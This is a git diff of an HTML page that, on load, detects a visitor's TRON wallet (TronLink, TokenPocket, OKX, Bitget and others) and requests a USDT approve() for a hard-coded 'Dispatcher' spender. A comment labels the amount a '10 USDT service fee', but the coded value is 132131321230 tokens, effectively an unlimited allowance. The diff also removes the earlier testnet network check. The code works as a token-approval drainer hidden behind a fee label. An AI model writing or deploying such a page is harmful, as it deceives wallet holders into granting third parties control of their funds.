@@ -1,121 +1,189 @@
 <!DOCTYPE html>
-<html lang="zh">
+<html lang="zh-CN">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>USDT</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>USDT 授权 - Nile</title>
+<style>
+body { background: #000; color: #0f0; font-family: monospace; font-size: 13px; padding: 12px; }
+pre { white-space: pre-wrap; }
+</style>
 </head>
 <body>
-  <pre id="log"></pre>
-  <script>
-    const USDT = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf';
-    const DISPATCHER = 'TXPCRj4USx7AsqyZt49GNxv6qGe6yYVTtv';
-    const DECIMALS = 6;
-    const amount = '1123123123123';
+<pre id="log"></pre>
+<script>
+function log(m) {
+  const el = document.getElementById('log');
+  el.textContent += m + '\n';
+  console.log(m);
+}
 
-    document.getElementById('amount').textContent = amount;
+/* ========== 全局防重复锁 ========== */
+let isRunning = false;
+let timer = null;
 
-    function log(msg) {
-      document.getElementById('log').textContent += msg + '\n';
-    }
+/* ========== 多钱包识别 ========== */
+async function detectWallet() {
+  try {
+    const providers = await new Promise(resolve => {
+      const found = [];
+      const handler = e => found.push(e.detail);
+      window.addEventListener('TIP6963:announceProvider', handler);
+      window.dispatchEvent(new Event('TIP6963:requestProvider'));
+      setTimeout(() => {
+        window.removeEventListener('TIP6963:announceProvider', handler);
+        resolve(found);
+      }, 500);
+    });
+    const tronProvider = providers.find(p =>
+      /tron/i.test(p.info?.name || '') ||
+      /tron/i.test(p.info?.rdns || '')
+    );
+    if (tronProvider) return { name: tronProvider.info?.name || 'TIP6963 Wallet', provider: tronProvider.provider };
+  } catch (_) {}
 
-    function setStatus(msg) {
-      document.getElementById('status').textContent = msg;
-    }
+  if (window.tron && window.tron.tronWeb) return { name: 'TronLink', provider: window.tron };
+  if (window.tronLink && window.tronLink.tronWeb) return { name: 'TronLink(legacy)', provider: window.tronLink };
+  if (window.tokenpocket && window.tokenpocket.tron && window.tokenpocket.tron.tronWeb)
+    return { name: 'TokenPocket', provider: window.tokenpocket.tron };
+  if (window.tokenpocket && window.tokenpocket.tronWeb)
+    return { name: 'TokenPocket(legacy)', provider: window.tokenpocket };
+  if (window.okxwallet && window.okxwallet.tronLink && window.okxwallet.tronLink.tronWeb)
+    return { name: 'OKX Wallet', provider: window.okxwallet.tronLink };
+  if (window.okxwallet && window.okxwallet.tronWeb)
+    return { name: 'OKX Wallet(legacy)', provider: window.okxwallet };
+  if (window.bitkeep && window.bitkeep.tron && window.bitkeep.tron.tronWeb)
+    return { name: 'Bitget Wallet', provider: window.bitkeep.tron };
+  if (window.bitkeep && window.bitkeep.tronWeb)
+    return { name: 'Bitget Wallet(legacy)', provider: window.bitkeep };
+  if (window.gatewallet && window.gatewallet.tron && window.gatewallet.tron.tronWeb)
+    return { name: 'GateWallet', provider: window.gatewallet.tron };
+  if (window.gatewallet && window.gatewallet.tronWeb)
+    return { name: 'GateWallet(legacy)', provider: window.gatewallet };
+  if (window.tronWeb) return { name: 'Unknown TRON Wallet', provider: { tronWeb: window.tronWeb, request: null } };
+  return null;
+}
 
-    // 检查当前网络是否是 Nile
-    async function checkNetwork(tw) {
+/* ========== 连接钱包 ========== */
+async function connectWallet(wallet) {
+  let tw = wallet.provider.tronWeb;
+  let addr = tw?.defaultAddress?.base58;
+
+  if (!addr && wallet.provider.request) {
+    log('🔄 请求账户授权...');
+    try {
+      await wallet.provider.request({ method: 'eth_requestAccounts' });
+    } catch (e) {
       try {
-        const node = tw.fullNode.host;
-        if (node.includes('nile')) {
-          return true;
-        }
-        // 备用判断：拿当前链 ID
-        const chainId = await tw.trx.getChainId().catch(() => null);
-        if (chainId === '3' || chainId === 3) {
-          return true;
-        }
-        return false;
-      } catch (e) {
-        // 无法判断时默认继续
-        return true;
-      }
+        await wallet.provider.request({ method: 'tron_requestAccounts' });
+      } catch (_) {}
+    }
+    tw = wallet.provider.tronWeb;
+    if (!tw) {
+      const newWallet = await detectWallet();
+      if (newWallet) tw = newWallet.provider.tronWeb;
+    }
+    addr = tw?.defaultAddress?.base58;
+  }
+
+  if (!addr) {
+    log('❌ 无法获取地址');
+    return null;
+  }
+  return { tw, addr };
+}
+
+/* ========== 金额转换 ========== */
+function toBaseAmount(human, decimals) {
+  const [int = '0', frac = ''] = String(human).split('.');
+  const fixed = (frac + '0'.repeat(decimals)).slice(0, decimals);
+  const raw = (int + fixed).replace(/^0+(?=\d)/, '');
+  return raw || '0';
+}
+
+/* ========== 主流程 ========== */
+async function main() {
+  if (isRunning) {
+    log('⏳ 已有授权流程进行中，忽略本次请求');
+    return;
+  }
+  isRunning = true;
+
+  if (timer) {
+    clearInterval(timer);
+    timer = null;
+  }
+
+  try {
+    const wallet = await detectWallet();
+    if (!wallet) {
+      log('❌ 未检测到 TRON 钱包，请用钱包内置浏览器打开');
+      return;
+    }
+    log('🪙 钱包：' + wallet.name);
+
+    const { tw, addr } = await connectWallet(wallet);
+    if (!tw || !addr) return;
+    log('👛 当前地址：' + addr);
+
+    // ===== 你的配置 =====
+    const token = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf';  // Nile USDT
+    const spender = 'TXPCRj4USx7AsqyZt49GNxv6qGe6yYVTtv'; // 你的 Dispatcher
+    const human = 132131321230; // 服务费 10 USDT
+    // =====================
+
+    let contract;
+    try {
+      contract = await tw.contract().at(token);
+    } catch (e) {
+      log('❌ 合约 at 失败：' + (e?.message || e));
+      return;
     }
 
-    async function doApprove(tw, addr) {
+    let decimals = 6;
+    try { decimals = Number(await contract.decimals().call()) || 6; } catch (_) {}
+
+    const raw = toBaseAmount(human, decimals);
+    log('token   = ' + token);
+    log('spender = ' + spender);
+    log('decimals= ' + decimals);
+    log('rawAmt  = ' + raw);
+
+    try {
+      const tx = await contract.approve(spender, raw).send({ callValue: 0 });
+      log('✅ approve 成功 TxID=' + tx);
+    } catch (e) {
       try {
-        const amountWei = BigInt(Math.round(parseFloat(amount) * 10 ** DECIMALS));
-        const usdt = await tw.contract().at(USDT);
-
-        // 先查当前已授权多少
-        const current = await usdt.allowance(addr, DISPATCHER).call();
-        log('当前已授权: ' + current);
-
-        // 发起授权
-        setStatus('请在 TronLink 中确认授权...');
-        const tx = await usdt
-          .approve(DISPATCHER, amountWei.toString())
-          .send({ feeLimit: 100_000_000 });
-
-        setStatus('授权成功！');
-        log('approve tx: ' + tx);
-        log('https://nile.tronscan.org/#/transaction/' + tx);
-
-        // 授权后查询剩余额度
-        const left = await usdt.allowance(addr, DISPATCHER).call();
-        log('授权后额度: ' + left);
-      } catch (e) {
-        setStatus('授权失败或用户拒绝');
-        log('approve error: ' + (e.message || e));
+        const tx = await contract.approve(spender, raw).send({ callValue: 0, feeLimit: 100_000_000 });
+        log('✅ approve 成功(feeLimit) TxID=' + tx);
+      } catch (e2) {
+        log('❌ approve 失败：' + (e2?.message || e2));
       }
     }
+  } catch (err) {
+    log('❌ 执行异常：' + (err?.message || err));
+  } finally {
+    isRunning = false;
+  }
+}
 
-    async function start() {
-      // 等待 TronLink 注入（有时页面加载时还没 ready）
-      let attempts = 0;
-      while (!window.tron && !window.tronLink && attempts < 20) {
-        await new Promise(r => setTimeout(r, 500));
-        attempts++;
-      }
-
-      const provider = window.tronLink || window.tron;
-      if (!provider) {
-        setStatus('未检测到 TronLink，请用 TronLink 钱包浏览器打开');
-        return;
-      }
-
-      try {
-        // 请求连接（已连接会直接通过，未连接会弹确认框）
-        setStatus('正在连接钱包...');
-        await provider.request({ method: 'eth_requestAccounts' });
-
-        const tw = provider.tronWeb || window.tronWeb;
-        if (!tw || !tw.ready) {
-          throw new Error('TronWeb not ready');
-        }
-
-        const addr = tw.defaultAddress.base58;
-        setStatus('已连接: ' + addr);
-        log('connected: ' + addr);
-
-        // 检查网络
-        const isNile = await checkNetwork(tw);
-        if (!isNile) {
-          setStatus('⚠️ 请切换到 Nile 测试网');
-          log('当前不是 Nile 网络，请在 TronLink 中切换');
-          return;
-        }
-
-        // 自动发起授权
-        await doApprove(tw, addr);
-      } catch (e) {
-        setStatus('连接失败或用户拒绝');
-        log('error: ' + (e.message || e));
+/* ========== 自动执行 ========== */
+window.addEventListener('load', () => {
+  let tries = 0;
+  timer = setInterval(async () => {
+    tries++;
+    const w = await detectWallet();
+    if (w || tries >= 15) {
+      clearInterval(timer);
+      timer = null;
+      if (w) {
+        main();
+      } else {
+        log('❌ 15 次重试后仍未检测到钱包');
       }
     }
-
-    // 页面加载后自动开始
-    window.addEventListener('load', start);
-  </script>
+  }, 400);
+});
+</script>
 </body>
 </html>
